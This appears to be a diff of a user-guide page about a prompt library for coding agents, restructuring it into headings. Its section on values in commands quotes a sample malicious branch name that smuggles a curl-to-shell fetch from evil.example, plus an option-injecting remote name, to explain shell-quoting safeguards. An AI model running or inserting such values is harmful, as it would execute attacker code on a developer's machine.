@@ -1,5 +1,7 @@
 # Prompts
 
+[Docs](../README.md) › [User guide](../README.md#user-guide) · Design: [`internal/launcher`](../architecture/launcher.md), [`internal/store`](../architecture/store.md) · See also: [Prompt files](../prompt-files.md)
+
 The **Prompts** tab is the prompt library: every prompt a launch can fill in. Each prompt has a
 **title** (its full name, such as "Review a pull request"), a **nickname** of up to 20
 characters (the short label the launch button and menu show, such as "Review"), what it is
@@ -7,71 +9,73 @@ characters (the short label the launch button and menu show, such as "Review"), 
 prompt an [upgrade on Deps](deps.md) fills in for a clone rather than for an item), its **text**,
 and optional **launch settings**.
 
-**Starter prompts.** The app adds twelve starters, each once: **Review** (review a pull request),
-**Work on it** (work on an issue), **Quick look** (a fast read of a pull request's diff for
-blockers only, set to Sonnet at low effort without a worktree), **Fix checks** (find and fix
-a pull request's failing checks, then push the fix), and **Fix dep security** (fix the failing
-security checks on a bot's dependency update: move the vulnerable dependency to a version that
-fixes it, never silence a scanner, and push with one exact `git push` to the pull request's
-own branch, named by its full ref and quoted, never forced; for a fork's pull request, or
-another outside contributor's, and for a branch or remote whose name isn't plain, it commits
-the fix but pushes nothing), and **Re-review** (review a pull request again, only what changed
-since the commit your last verdict was on, or the whole of it when that commit is no longer in
-its branch's history, as after a force-push). Four more are the starters Autopilot's [templates](autopilot/templates-and-quick-setup.md) run: **Heal
-Dependabot PR** (adapt the code to what a dependency update broke, never pinning it back or
-silencing a check, and push as Fix dep security does), **Address review** (work through the
-changes a review asked for, acting only on members' and collaborators' requests), **Resolve
-conflicts** (merge the base branch in, never a rebase, and push as Fix dep security does), and
-**Re-run failed jobs** (re-run a pull request's failed jobs once with `gh run rerun --failed`,
-changing nothing else, set to Haiku at low effort). Two more are for repositories, the ones
-[Deps](deps.md)' upgrade sheet offers as **Minor and patch** and **Majors too**: **Upgrade deps**
-(upgrade a repository's Go and JavaScript dependencies within their major versions, run its
-checks, commit, push its branch, and open a pull request that lists the newer majors it left
-alone) and **Upgrade majors too** (the same, major versions included, keeping only those whose
-checks pass after a reasonable fix). Both start in a worktree, out of plan mode; each names the
-clone's remote in its push only when that name is plain, and otherwise commits and stops, and
-names the default branch in `gh pr create --base` only when it is one plain word. A
-starter new in a later version is added to your library once, as these were, and a starter
-whose text you never changed takes the new text when a later version changes it, keeping the
-title and settings you gave it. Review and Work
-on it are the app's first
-defaults for pull requests and issues, and Fix checks, Resolve conflicts, Address review, and
-Re-review its first prompts for a pull request whose checks fail, that conflicts with its base,
-that a reviewer asked to change, and that you're asked to review again (see
-[Launch defaults](launch-defaults.md)); each of those is filled once, so one you clear, or whose
-starter you delete, stays as you left it. From then on every prompt is yours to change, duplicate,
-or delete; a deleted starter is not added back. **Reset to original** restores a changed
-starter's title, text, and settings.
+## Starter prompts
 
-**The page.** The library is on the left, grouped by what each prompt is for (**Pull
-requests**, **Issues**, **Both**, and **Repositories**), with search; a
-star marks the app's defaults, a situation's among them, "Default in N places" counts the
-org and repository defaults that name one, for a kind or a situation, and "Used by N routines"
-the [Autopilot](autopilot/README.md) routines that run it. A prompt a
-routine runs can't be deleted (it says which routine uses it), and renaming one renames it in
-every routine that names it, so a routine never loses its prompt; one that goes anyway, as
-through an import, keeps the routine's runs from starting, saying so. The selected prompt's
-editor is in the middle, and the **Variables** cheat sheet is
-always on the right, in a window wide enough for it. The editor's **Edit | Preview** switch
-(⇧⌘P, even while typing) shows the prompt filled in, live, in place of its text; it stays
-on as you move between prompts, so previews can be compared, and a new prompt opens in Edit.
-Clicking a variable or a problem while previewing goes back to Edit first. Save with **Save**
-or ⌘S; leaving a prompt with unsaved changes asks first, and a draft survives switching tabs.
-The **⋯** menu holds **Make the default for pull requests** (or issues), **Duplicate**,
-**Reset to original**, and **Delete**.
+The app adds twelve starters, each once: **Review** (review a pull request), **Work on it** (work on
+an issue), **Quick look** (a fast read of a pull request's diff for blockers only, set to Sonnet at
+low effort without a worktree), **Fix checks** (find and fix a pull request's failing checks, then
+push the fix), and **Fix dep security** (fix the failing security checks on a bot's dependency
+update: move the vulnerable dependency to a version that fixes it, never silence a scanner, and push
+with one exact `git push` to the pull request's own branch, named by its full ref and quoted, never
+forced; for a fork's pull request, or another outside contributor's, and for a branch or remote
+whose name isn't plain, it commits the fix but pushes nothing), and **Re-review** (review a pull
+request again, only what changed since the commit your last verdict was on, or the whole of it when
+that commit is no longer in its branch's history, as after a force-push). Four more are the starters
+Autopilot's [templates](autopilot/templates-and-quick-setup.md) run: **Heal Dependabot PR** (adapt
+the code to what a dependency update broke, never pinning it back or silencing a check, and push as
+Fix dep security does), **Address review** (work through the changes a review asked for, acting only
+on members' and collaborators' requests), **Resolve conflicts** (merge the base branch in, never a
+rebase, and push as Fix dep security does), and **Re-run failed jobs** (re-run a pull request's
+failed jobs once with `gh run rerun --failed`, changing nothing else, set to Haiku at low effort).
+Two more are for repositories, the ones [Deps](deps.md)' upgrade sheet offers as **Minor and patch**
+and **Majors too**: **Upgrade deps** (upgrade a repository's Go and JavaScript dependencies within
+their major versions, run its checks, commit, push its branch, and open a pull request that lists
+the newer majors it left alone) and **Upgrade majors too** (the same, major versions included,
+keeping only those whose checks pass after a reasonable fix). Both start in a worktree, out of plan
+mode; each names the clone's remote in its push only when that name is plain, and otherwise commits
+and stops, and names the default branch in `gh pr create --base` only when it is one plain word. A
+starter new in a later version is added to your library once, as these were, and a starter whose
+text you never changed takes the new text when a later version changes it, keeping the title and
+settings you gave it. Review and Work on it are the app's first defaults for pull requests and
+issues, and Fix checks, Resolve conflicts, Address review, and Re-review its first prompts for a
+pull request whose checks fail, that conflicts with its base, that a reviewer asked to change, and
+that you're asked to review again (see [Launch defaults](launch-defaults.md)); each of those is
+filled once, so one you clear, or whose starter you delete, stays as you left it. From then on every
+prompt is yours to change, duplicate, or delete; a deleted starter is not added back. **Reset to
+original** restores a changed starter's title, text, and settings.
 
-**Deleting.** A prompt can be deleted once nothing uses it as a default. Deleting one that is
-the app's default for a kind or a situation, or an org's or repository's default, lists where
-it is used instead (as in "acme-org's prompt when checks fail"), so the defaults can be changed
-first. For the same reason, a prompt that is a default
-for pull requests must keep applying to them, and a prompt a routine runs can't be made one for
-repositories, since a routine runs its prompts on pull requests and issues.
+## The page
 
-**Writing a prompt.** A prompt is a Go [text/template](https://pkg.go.dev/text/template). The
-editor colors it as you type: variables tinted, unknown names red, keywords and functions in
-the accent. Typing `{{` or a dot inside an action offers the variables, filtered as you type;
-the arrows choose, Enter or Tab inserts, and Escape closes the list. Clicking a variable or a
-syntax snippet in the cheat sheet inserts it at the caret.
+The library is on the left, grouped by what each prompt is for (**Pull requests**, **Issues**,
+**Both**, and **Repositories**), with search; a star marks the app's defaults, a situation's among
+them, "Default in N places" counts the org and repository defaults that name one, for a kind or a
+situation, and "Used by N routines" the [Autopilot](autopilot/README.md) routines that run it. A
+prompt a routine runs can't be deleted (it says which routine uses it), and renaming one renames it
+in every routine that names it, so a routine never loses its prompt; one that goes anyway, as
+through an import, keeps the routine's runs from starting, saying so. The selected prompt's editor
+is in the middle, and the **Variables** cheat sheet is always on the right, in a window wide enough
+for it. The editor's **Edit | Preview** switch (⇧⌘P, even while typing) shows the prompt filled in,
+live, in place of its text; it stays on as you move between prompts, so previews can be compared,
+and a new prompt opens in Edit. Clicking a variable or a problem while previewing goes back to Edit
+first. Save with **Save** or ⌘S; leaving a prompt with unsaved changes asks first, and a draft
+survives switching tabs. The **⋯** menu holds **Make the default for pull requests** (or issues),
+**Duplicate**, **Reset to original**, and **Delete**.
+
+## Deleting
+
+A prompt can be deleted once nothing uses it as a default. Deleting one that is the app's default
+for a kind or a situation, or an org's or repository's default, lists where it is used instead (as
+in "acme-org's prompt when checks fail"), so the defaults can be changed first. For the same reason,
+a prompt that is a default for pull requests must keep applying to them, and a prompt a routine runs
+can't be made one for repositories, since a routine runs its prompts on pull requests and issues.
+
+## Writing a prompt
+
+A prompt is a Go [text/template](https://pkg.go.dev/text/template). The editor colors it as you
+type: variables tinted, unknown names red, keywords and functions in the accent. Typing `{{` or a
+dot inside an action offers the variables, filtered as you type; the arrows choose, Enter or Tab
+inserts, and Escape closes the list. Clicking a variable or a syntax snippet in the cheat sheet
+inserts it at the caret.
 
 | Variable | What it holds |
 |---|---|
@@ -98,48 +102,53 @@ the functions `and`, `or`, `not`, `eq`, `ne`, `lt`, `le`, `gt`, `ge`, `len`, `pr
 filling in a prompt always finishes quickly. When a prompt is sent, trailing spaces are
 trimmed and runs of blank lines collapse to one.
 
-**Values in commands.** A branch, a title, or a label is whatever its author typed, and git
-takes a branch named `x;$(curl${IFS}evil.example|sh)`. Put such a value into a command the agent
-should run through `shellquote`, as in `` `git switch {{shellquote .Branch}}` ``: it writes
-the value as one word, as it is when every shell reads it as itself, or else in single quotes,
-so the shell never runs any of it. Quoting can't stop everything a name can do, though: git
-reads a remote named `--upload-pack=…` as an option, and a branch named `ma<LRM>in`, with a
-hidden left-to-right mark that every value loses on its way into a prompt, shows as `main`. So
-name a branch or a remote in a command only under `{{if .BranchIsPlain}}` or
-`{{if .RemoteIsPlain}}`, which hold when the name, exactly as given, is ASCII letters, digits,
-and `-_./:,+@%=` alone and starts with neither `-` nor `=`, as every Dependabot and Renovate
-branch does.
-A number needs no quoting, nor do `.Repo`, `.Owner`, and `.RepoName`, which GitHub keeps to
-letters, digits, and `-_.`, nor `.HeadCommit` and `.ReviewedCommit`, which are hex.
+## Values in commands
 
-**Checking.** Every edit is checked as you type, by the same Go template package that fills
-the prompt in at launch. Each problem is listed under the editor with its line and column and
-underlined in the text; clicking it selects the spot. An unknown variable suggests the closest
-one ("`.Titel` isn't a variable. Did you mean `.Title`?"), an `{{if}}` that is never closed
-points at that `{{if}}`, and errors that only show when a prompt runs (comparing text with a
-number, say) are found by filling the prompt in with sample data for every kind and session it
-applies to, or, for a prompt for repositories, for a sample repository, in the clone and in a
-worktree. Warnings, such as a pull-request-only variable in an issue prompt, an item's variable
-in a prompt for repositories, or a prompt that starts with a variable, don't block saving;
-errors do.
+A branch, a title, or a label is whatever its author typed, and git takes a branch named
+`x;$(curl${IFS}evil.example|sh)`. Put such a value into a command the agent should run through
+`shellquote`, as in `` `git switch {{shellquote .Branch}}` ``: it writes the value as one word, as
+it is when every shell reads it as itself, or else in single quotes, so the shell never runs any of
+it. Quoting can't stop everything a name can do, though: git reads a remote named `--upload-pack=…`
+as an option, and a branch named `ma<LRM>in`, with a hidden left-to-right mark that every value
+loses on its way into a prompt, shows as `main`. So name a branch or a remote in a command only
+under `{{if .BranchIsPlain}}` or `{{if .RemoteIsPlain}}`, which hold when the name, exactly as
+given, is ASCII letters, digits, and `-_./:,+@%=` alone and starts with neither `-` nor `=`, as
+every Dependabot and Renovate branch does. A number needs no quoting, nor do `.Repo`, `.Owner`, and
+`.RepoName`, which GitHub keeps to letters, digits, and `-_.`, nor `.HeadCommit` and
+`.ReviewedCommit`, which are hex.
 
-**Preview.** The preview fills the prompt in for a real inbox item (or a sample), exactly as a
-launch would, in the text's own frame and at its size, with the item to fill it in for and
-switches for **In a worktree** and **At the PR's head** above it. For an outside
-contributor's item it also shows the line every such prompt ends with. Below it are its
-length and **Copy**, which copies the text as a launch sends it, that line included. The
-text and its undo history are kept while previewing, so Edit picks up where it was. A review
-reply previews as the review sheet fills it in, with no session switches. No inbox item is a
-repository, so a prompt for repositories previews with **A sample repository** alone,
-acme-org/example-repo (its default branch `main`, its remote `origin`), in the clone, or, with
-**In a worktree**, in `deps-20260115`, as an upgrade names its worktree, and the cheat sheet's
-values are the sample repository's.
+## Checking
 
-**Launch settings.** A prompt can set a model and extra flags for each coding agent, on a tab
-per agent, and the effort, plan mode, and worktree for every agent; they win over the org's and
-repository's defaults whenever it is chosen. A prompt never chooses the agent or the profile,
-so a prompt can't put a repository on the wrong account. A prompt for repositories' worktree
-setting changes nothing: a launch for a repository always starts in a new worktree of its own.
+Every edit is checked as you type, by the same Go template package that fills the prompt in at
+launch. Each problem is listed under the editor with its line and column and underlined in the text;
+clicking it selects the spot. An unknown variable suggests the closest one ("`.Titel` isn't a
+variable. Did you mean `.Title`?"), an `{{if}}` that is never closed points at that `{{if}}`, and
+errors that only show when a prompt runs (comparing text with a number, say) are found by filling
+the prompt in with sample data for every kind and session it applies to, or, for a prompt for
+repositories, for a sample repository, in the clone and in a worktree. Warnings, such as a
+pull-request-only variable in an issue prompt, an item's variable in a prompt for repositories, or a
+prompt that starts with a variable, don't block saving; errors do.
+
+## Preview
+
+The preview fills the prompt in for a real inbox item (or a sample), exactly as a launch would, in
+the text's own frame and at its size, with the item to fill it in for and switches for **In a
+worktree** and **At the PR's head** above it. For an outside contributor's item it also shows the
+line every such prompt ends with. Below it are its length and **Copy**, which copies the text as a
+launch sends it, that line included. The text and its undo history are kept while previewing, so
+Edit picks up where it was. A review reply previews as the review sheet fills it in, with no session
+switches. No inbox item is a repository, so a prompt for repositories previews with **A sample
+repository** alone, acme-org/example-repo (its default branch `main`, its remote `origin`), in the
+clone, or, with **In a worktree**, in `deps-20260115`, as an upgrade names its worktree, and the
+cheat sheet's values are the sample repository's.
+
+## Launch settings
+
+A prompt can set a model and extra flags for each coding agent, on a tab per agent, and the effort,
+plan mode, and worktree for every agent; they win over the org's and repository's defaults whenever
+it is chosen. A prompt never chooses the agent or the profile, so a prompt can't put a repository on
+the wrong account. A prompt for repositories' worktree setting changes nothing: a launch for a
+repository always starts in a new worktree of its own.
 
 ## Review replies
 
@@ -153,35 +162,40 @@ for issues (the library marks them **For issues**, or **For pull requests and is
 review sheet those for pull requests; an approval and a request for changes are always for pull
 requests.
 
-**Starter replies.** **LGTM** (approve, the default for people): "Reviewed and approved. Thanks
-for the work on this, @{{.Author}}!" **Update OK** (approve, the default for bots): "Reviewed the
-minor update of `golang.org/x/net` from 0.30.0 to 0.31.0. All checks pass. Approved.", which says
-"Reviewed this automated update." when the title says nothing it can read, and "All checks pass."
-only when they do. **Needs
-changes** (request changes) and **Question** (comment). **Nudge** (comment, the default for
-nudges): "Hi @{{.Author}}, just checking in on the changes requested here. Is anything unclear,
-or anything blocking you? Happy to help." **Needs repro** (comment, for issues: it asks the person who
-opened the issue how to reproduce it, and fills no default, since a review's default is for pull
-requests; the Ask for a repro on quiet bugs template comments it). Like the starter prompts, each is added
-once, and **Reset to original** restores one you changed.
+### Starter replies
 
-**Defaults.** The **⋯** menu makes a reply the default for approvals, for approvals of bots' pull
-requests, for requests for changes, for comments, or for nudges. The sheet fills the default in
-for the review you're about to send, a bot's default on a bot's pull request, until you write
-your own text; with no default, the text starts empty. The default for nudges is a comment
-reply too: it fills in the comment a **Waiting on the author** card's **Nudge** posts to the
-author of a pull request you requested changes on, and with none the comment starts empty.
-Deleting a reply that is a default clears that default. A default is for pull requests, so a
-reply for issues alone is never one, and the defaults for comments and nudges can't be changed
-to one; the issue sheet has no default. A library from before nudges gets the **Nudge** starter
-as the default for nudges once, unless you already chose one.
+**LGTM** (approve, the default for people): "Reviewed and approved. Thanks for the work on this,
+@{{.Author}}!" **Update OK** (approve, the default for bots): "Reviewed the minor update of
+`golang.org/x/net` from 0.30.0 to 0.31.0. All checks pass. Approved.", which says "Reviewed this
+automated update." when the title says nothing it can read, and "All checks pass." only when they
+do. **Needs changes** (request changes) and **Question** (comment). **Nudge** (comment, the default
+for nudges): "Hi @{{.Author}}, just checking in on the changes requested here. Is anything unclear,
+or anything blocking you? Happy to help." **Needs repro** (comment, for issues: it asks the person
+who opened the issue how to reproduce it, and fills no default, since a review's default is for pull
+requests; the Ask for a repro on quiet bugs template comments it). Like the starter prompts, each is
+added once, and **Reset to original** restores one you changed.
 
-**Writing one.** A reply is a template like a prompt, with the same variables, checked the same
-way, with three differences: it may start with `-`, for a markdown list; it may come out empty,
-as an approval with no text does; and a session variable (`.InWorktree`, `.WorktreeOnPRHead`,
-`.Worktree`, `.Profile`) is a warning, since a reply starts no session. A reply never gets the
-lines an agent's prompt ends with. The preview fills it in for a real item, and a comment reply
-for issues warns about a pull-request variable, which is always empty for an issue.
+### Defaults
+
+The **⋯** menu makes a reply the default for approvals, for approvals of bots' pull requests, for
+requests for changes, for comments, or for nudges. The sheet fills the default in for the review
+you're about to send, a bot's default on a bot's pull request, until you write your own text; with
+no default, the text starts empty. The default for nudges is a comment reply too: it fills in the
+comment a **Waiting on the author** card's **Nudge** posts to the author of a pull request you
+requested changes on, and with none the comment starts empty. Deleting a reply that is a default
+clears that default. A default is for pull requests, so a reply for issues alone is never one, and
+the defaults for comments and nudges can't be changed to one; the issue sheet has no default. A
+library from before nudges gets the **Nudge** starter as the default for nudges once, unless you
+already chose one.
+
+### Writing one
+
+A reply is a template like a prompt, with the same variables, checked the same way, with three
+differences: it may start with `-`, for a markdown list; it may come out empty, as an approval with
+no text does; and a session variable (`.InWorktree`, `.WorktreeOnPRHead`, `.Worktree`, `.Profile`)
+is a warning, since a reply starts no session. A reply never gets the lines an agent's prompt ends
+with. The preview fills it in for a real item, and a comment reply for issues warns about a
+pull-request variable, which is always empty for an issue.
 
 A reply is never an agent's prompt: the launch menu, launch defaults, and Settings → Launching
 list agent prompts only.
@@ -218,13 +232,14 @@ them in more than one place and brings them back on its own when it can.
   missing, and it works again once the profile is back. Agent profiles themselves need no
   copy: they are found in your home directory on every start.
 
-**Export and import.** The library menu (**⋯** beside **New**) holds **Export all prompts and
-replies…**, **Import from a file…**, and **Restore from a backup…**; a prompt's own **⋯** menu
-holds **Export…** for that one prompt. An export is a [prompt file](../prompt-files.md) you can
-share or keep. A whole-library export holds every agent prompt and every
-[review reply](#review-replies), comment replies for issues among them, and also records your
-default prompts, your default replies, and which starters you deleted; the message after it
-counts the prompts and the replies apart.
+### Export and import
+
+The library menu (**⋯** beside **New**) holds **Export all prompts and replies…**, **Import from a
+file…**, and **Restore from a backup…**; a prompt's own **⋯** menu holds **Export…** for that one
+prompt. An export is a [prompt file](../prompt-files.md) you can share or keep. A whole-library
+export holds every agent prompt and every [review reply](#review-replies), comment replies for
+issues among them, and also records your default prompts, your default replies, and which starters
+you deleted; the message after it counts the prompts and the replies apart.
 
 Importing first shows every prompt in the file and what importing it would do, each with a box
 to leave it out. Below them, under **Defaults**, it offers each of the file's defaults that
